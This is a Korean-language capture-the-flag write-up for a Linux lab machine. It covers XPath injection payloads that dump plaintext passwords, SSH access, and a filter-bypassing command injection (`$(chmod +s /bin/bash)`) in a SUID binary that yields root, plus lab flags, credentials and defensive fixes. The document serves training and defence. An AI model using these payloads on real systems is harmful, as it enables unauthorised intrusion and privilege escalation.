---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/enum/dirbust
  - tech/web/auth
  - tech/web/xpathi
  - tech/rce/cmd
  - tech/lin/suid
type: machine
platform: pg
os: linux
ip: 192.168.248.202
ports: [22, 80]
services: [http, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 5
---
> [!info] 상단 요약
> 타겟 192.168.248.202 · Linux(Ubuntu 20.04) · Fundamental · 플래그 2개
> **완료 2/2.** register 이메일 도메인 `@wheels.service` 로 employee 세션 획득 → 포털 검색의 **XPath injection**
> 으로 XML 저장소의 **평문 비밀번호** 덤프 → `ssh bob` → SUID `/opt/get-list` **명령주입**(`$()` 로 `;|&` 필터 우회) → root.
> user `dad9316cbb189a7deeeaf3106eaf489d` · root `f7769b4377f22a16f5ec85e7da8c4aca` (2026-08-21 인스턴스).

> [!warning] 적대적 검증 정정 이력 (2026-08-21)
> 산출물(`~/PG/Wheels/`)·바이너리 재분석으로 대조했다. 터미널 블록 10개 전부 실측과 일치(날조 0). 정정한 것:
> - **`/tmp` 를 `nosuid` 라고 적었던 서술 → 정정.** 실측 마운트는 `/dev/sda2 on / ext4 rw,relatime`(별도 `/tmp` 없음)라 `/tmp` 는 nosuid 가 아니다. nosuid 는 `/dev/shm` 뿐. in-place `chmod +s /bin/bash` 선택 근거를 사실에 맞게 고침(4장·「남긴 흔적」).
> - **`bob may not run sudo` 인용 → 정정.** 실측된 것은 `sudo -n` 의 "a password is required"(NOPASSWD 없음)뿐. `sudo -l` 성공 출력은 산출물에 없어 그 문장을 인용으로 남기지 않음.

## 0. 이 박스에서 배우는 것

- **권한 게이트가 "역할 컬럼"이 아니라 "가입 이메일 도메인"** 일 수 있다. 포털이 `Access Denied` 만 뱉으면 **가입 필드(도메인)**를 의심하라.
- **XPath injection** — SQLi 와 형제지만 별도 클래스. `contains(field,'$x')` 에 `x') or ('1'='1` 로 전체 덤프, `substring()` blind 로 필드 추출.
- **DB 해시와 별개의 평문 저장소.** bcrypt 를 못 깬다고 막힌 게 아니다 — 포털은 MySQL 이 아니라 **XML 파일**을 참조했고 거기 평문이 있었다.
- SUID 바이너리의 `system("/bin/cat ... %s")` **명령주입**과, `strchr` 문자 필터(`;` `|` `&`)를 **`$()`/백틱**으로 우회하는 법.
- 시험 반사: 응답 지연(≈0.4s)이 bcrypt 신호였고, 나는 여기서 브루트에 시간을 태웠다(→ 6장).

## 1. 정찰

### Nmap

```
Nmap scan report for 192.168.248.202
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
80/tcp open  http  Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Wheels - Car Repair Services
```

포트 22·80 뿐. Apache 2.4.41 은 CVE-2021-41773(2.4.49/50) 대상이 아니다 — 버전으로 거른다.

### 열거

무료 "CarServ" Bootstrap 템플릿 + 커스텀 인증. gobuster(common→medium→raft, 인증 세션 포함):

```
index.html  login.php  register.php  portal.php(302->login)  config.php(200,0B)
assets/{check.php(302->login), header.php, footer.php}
```

`register.php`(username[클라 pattern, 서버 미강제], **email UNIQUE**, password), `login.php`, `portal.php`("Employee Portal").
푸터에 `info@wheels.service` 노출 — **이 도메인이 뒤의 권한 게이트 열쇠**였다.

## 2. 취약점 분석

### 진입 게이트 = 가입 이메일 도메인

일반 이메일로 가입한 계정은 로그인해도 `portal.php` 가 `<h1>Access Denied</h1>`(23바이트)만 준다.
**`register.php` 에 `email=<임의>@wheels.service` 로 가입**하면 로그인 세션에 employee 권한이 붙어 포털 본문이 열린다.
이메일이 UNIQUE 라 로컬파트만 바꾸면 계정을 얼마든 찍어낼 수 있다.

### XPath injection (`portal.php:68`)

포털 본문의 "Filter Users By Services" 검색은 `../Search/works.xml` 을 XPath 로 조회한다. 소스(bob 로 확보):

```php
$work = $_REQUEST["work"];
if (($work != 'car') and ($work != 'bike')){ echo 'XML Error; No ',$work,' entity found'; };
$xml = simplexml_load_file("../Search/works.xml");
$result = $xml->xpath("//work[contains(service, '$work')]/employee");
```

`$work` 를 **작은따옴표 안에 그대로** 끼워 넣는다. `work=car'` → `SimpleXMLElement::xpath(): Invalid expression`(홀수 따옴표 확정).
결과 노드마다 화면에 표로 출력하므로 **boolean/추출 오라클**이 선다.

`works.xml` 구조(각 work: `id`,`employee`,`password`(평문),`service`):

```xml
<work><id>1</id><employee>bob</employee><password>Iamrockinginmyroom1212</password><service>car</service></work>
... alice/john(car), dan/alex/selene(bike)
```

## 3. Foothold

### 페이로드 조각내기

전체 사용자 덤프:

```
GET /portal.php?work=x') or ('1'='1&action=search
```
→ `//work[contains(service,'x') or ('1'='1')]/employee` → 6명 전원 반환(bob alice john / dan alex selene).

평문 password 추출(blind, 필드 3번째가 password):
```
work = zzz') or (*='bob' and (substring(*[3],<i>,1)='<c>')) or ('1'='2
```
결과에 대상이 나타나면 그 글자 참. 한 글자씩 회수 → `bob : Iamrockinginmyroom1212`.
(추출기 `~/PG/Wheels/dump2.py`. XML 평문이라 DB bcrypt 를 건드릴 필요가 없었다.)

### SSH

```
ssh bob@192.168.248.202     # Iamrockinginmyroom1212
bob@wheels:~$ id
uid=1000(bob) gid=1000(bob) groups=1000(bob)
bob@wheels:~$ cat local.txt
dad9316cbb189a7deeeaf3106eaf489d
```

`bob` 만 홈/SSH 계정이 있다(나머지 5명은 XML 전용). `sudo -n` 은 비밀번호를 요구한다(NOPASSWD 엔트리 없음). bob 은 자기 그룹(`groups=1000(bob)`) 뿐이라 sudo 로 올릴 여지도 없다 [가정].

## 4. 권한상승 — SUID `/opt/get-list` 명령주입

`harvest.sh` 회수 후 **커스텀 SUID** 하나가 눈에 띈다(나머지는 전부 snap/시스템):

```
bob@wheels:~$ ls -l /opt/get-list
-rwsr-sr-x 1 root root 16808 May 11  2022 /opt/get-list
```

동작: "customers/employees" 중 뭘 열지 묻고 `/bin/cat /root/details/<입력>` 를 **`system()`** 으로 실행. objdump 로 필터 확인:

```
strchr(buf, 0x3b);  # ';'  → 있으면 에러
strchr(buf, 0x7c);  # '|'  → 있으면 에러
strchr(buf, 0x26);  # '&'  → 있으면 에러
strstr(buf,"customers") || strstr(buf,"employees")  # 둘 다 없으면 에러
snprintf(cmd,"/bin/cat /root/details/%s", buf); setuid(geteuid()); system(cmd);
```

`;` `|` `&` 는 막지만 **명령치환 `$()`/백틱은 안 막는다.** `setuid(geteuid())` 로 실uid=0 이 된 뒤 `system()` 이므로 주입은 root 로 돈다.

**페이로드**: `employees$(chmod +s /bin/bash)`
- "employees" 포함 → `strstr` 통과. `;|&` 없음 → `strchr` 통과.
- `$()` 안에 `;` 를 못 쓰니 **한 명령만** — `/bin/bash` 를 그 자리에서 setuid 로.

```
bob@wheels:~$ echo 'employees$(chmod +s /bin/bash)' | /opt/get-list
...
bob@wheels:~$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
bob@wheels:~$ /bin/bash -p
bash-5.0# id
uid=1000(bob) gid=1000(bob) euid=0(root) egid=0(root) groups=0(root),1000(bob)
bash-5.0# cat /root/proof.txt
f7769b4377f22a16f5ec85e7da8c4aca
```

> [!note] 왜 root 인가 — 추측 아님
> `/opt/get-list` 는 **직접 실행하는 SUID root 바이너리**(rws, cron/서비스 아님)다. `setuid(geteuid())` 로 euid=0→realuid=0
> 만든 뒤 `system()` 을 호출하므로 주입 명령이 root 로 실행된다. `id` 의 `euid=0(root)` 가 그 증거.

경로 대안: `/dev/shm` 은 tmpfs `nosuid`(마운트 `rw,nosuid,nodev`)라 거기 새 SUID 바이너리를 두는 방식은 **실패**한다. `/tmp` 는 별도 마운트가 아니라 루트 `ext4`(`/dev/sda2 on / rw,relatime`) 위라 `nosuid` 가 아니어서 거기 두는 방식 자체는 가능했지만, 새 파일을 만들 필요 없이 기존 `/bin/bash` 에 in-place `chmod +s`(→`bash -p`)하는 편이 남기는 흔적이 적고 되돌리기 쉬웠다.

## 5. 플래그

| | 값 | 경로 | 셸 |
|---|---|---|---|
| user | `dad9316cbb189a7deeeaf3106eaf489d` | `/home/bob/local.txt` | SSH bob(대화형) |
| root | `f7769b4377f22a16f5ec85e7da8c4aca` | `/root/proof.txt` | setuid `bash -p`(euid=0) |

## 6. 막혔던 지점 / 시행착오 — 내가 태운 시간

첫 러너(나)는 **포털에 못 들어가** 진짜 취약점(검색 XPath)을 아예 못 봤다. 그 이유와 배제 과정:

- **권한 게이트를 "역할/is_admin 컬럼"으로 오판.** register 에 role/is_admin/... ~35개 mass-assignment, 쿠키·XFF·배열우회·ffifdyop·사용자명 충돌, login/register 전 필드 SQLi(time+boolean+2차) — **전부 아님**. 게이트는 **가입 이메일 도메인 `@wheels.service`** 였는데 `@wheels.serv`(whatweb 오탐) 만 보고 `.service` 를 못 떠올렸다.
- **login 을 first-row 조회형으로 파고들어 사용자 열거**까지 했다(시드 `bob` 확정). 유효한 관측이지만 **bob 비번이 필요**했고, 여기서 잘못된 길로 샜다.
- ⚠️ **bcrypt 브루트에 시간을 태웠다.** 로그인 응답 ≈0.4s/try(20연속 7.9s)는 **bcrypt `password_verify` 신호**였다. hydra ~215/min → rockyou 완주 1000시간+. rockyou top-1500 미탐이면 온라인으론 못 얻는다 — **이 시점에서 접고 다른 진입 벡터로 갔어야** 했다. 실제 정답은 크랙이 아니라 **XML 평문 읽기**였고, 비번 `Iamrockinginmyroom1212`(문장형)이라 워드리스트 밖이었던 것도 당연했다.

권한상승 쪽 헛다리는 적었다: `sudo -n` 은 비번 요구, `id` 그룹은 `bob` 뿐(LazySysAdmin `sudo`·Fikklish `lxd` 같은 그룹 단서 없음) → **커스텀 SUID `/opt/get-list`** 로 바로 수렴.

## 7. OSCP 시험 관점

- **포털이 `Access Denied` 만 주면 가입/세션 필드를 의심하라** — 역할 컬럼만이 게이트가 아니다. 이메일 도메인·가입 순서·히든 필드.
- **버전 판정은 독립 근거 2개** — `wheels.serv`(whatweb 이메일 파싱) 하나만 믿었다가 `.service` 도메인을 놓쳤다([[Hub]]·[[Levram]] 패턴).
- **응답 지연은 해시 알고리즘 신호.** bcrypt 냄새가 나면 온라인 브루트를 조기에 접고 **다른 곳에 평문/약한 저장소가 없나** 본다.
- 수동 XPath: `x') or ('1'='1` 로 덤프, `substring(*[n],i,1)='c'` blind. sqlmap 은 시험 금지지만 이건 애초에 수동이다.
- SUID 명령주입: `strings`·`objdump` 로 `system`/포맷문자열/필터를 먼저 읽고, 필터(`;|&`)는 **`$()`/개행/`<`·`>`** 로 우회. `#!/bin/sh` SUID 스크립트는 dash 가 euid 를 버려 실패 — C 바이너리나 `chmod +s /bin/bash`+`bash -p`.
- 셸 잡자마자: `id · sudo -l · find / -perm -4000 · getcap -r / · crontab -l`.

## 8. 방어 관점

- XPath 쿼리에 사용자 입력을 문자열 결합하지 말 것 — 파라미터화하거나 화이트리스트(`car`/`bike`)를 **실제로 강제**(현재 코드는 경고만 찍고 계속 진행).
- **비밀번호를 평문 XML로 저장하지 말 것.** DB 는 bcrypt 인데 병렬 XML 저장소가 평문이면 해싱이 무의미.
- 권한 게이트를 클라이언트 제어 가능한 이메일 도메인에 걸지 말 것.
- `system()`+포맷문자열 SUID 를 없애고, 필요하면 인자 화이트리스트와 절대경로·`execve` 사용. `/opt/get-list` 에서 SUID 비트 제거.

## 9. 참고 자료

- XPath injection(OWASP) · GTFOBins `bash`(SUID) · PHP `SimpleXMLElement::xpath`.
- config.php DB 자격증명(권한상승엔 불필요): `wheels : CanRipperCrackthis?09` (MySQL, bcrypt 저장 — John 크랙 유도용 미끼 문구).

## 남긴 흔적 / 관련 노트

- 상세: `03. PG/_AUDIT/Wheels-run.md`(내 초기 열거·배제), `_AUDIT/Wheels-web-entry.md`(웹 진입점 규명). Kali `~/PG/Wheels/`(nmap·gobuster·get-list 바이너리·dump2.py·proof_*·works_xml.txt·traces_confirmed.log).
- **정리 확인**: `/bin/bash` setuid → **0755 복구 확인**(`-rwxr-xr-x 1 root root 1183448`). `/tmp/.h`(harvest 출력) 삭제 확인. 임시 SUID 바이너리는 애초에 만들지 않았다(`/dev/shm` 은 nosuid, `/tmp` 는 안 씀). 내 리스너 0, tmux 0.
- **되돌리지 못한 것: 웹 더미계정·주입 흔적 → 다음 인스턴스에서 소멸.** 두 러너가 등록한 계정(초기 열거의 admin·dupx·firstname 계열 + 웹전문의 `@wheels.service` employee 계정)이 MySQL `wheels` DB 에 남았고, DB/XML 직접 편집은 root 였어도 위험 대비 이득이 없어 하지 않았다 — 박스 리버트로만 제거된다. Apache access 로그의 스캔/브루트/XPath 주입 흔적도 **삭제 안 함(확인만)**.
- 패턴 링크: 버전 판정 독립근거 2개 [[Hub]]·[[Levram]].
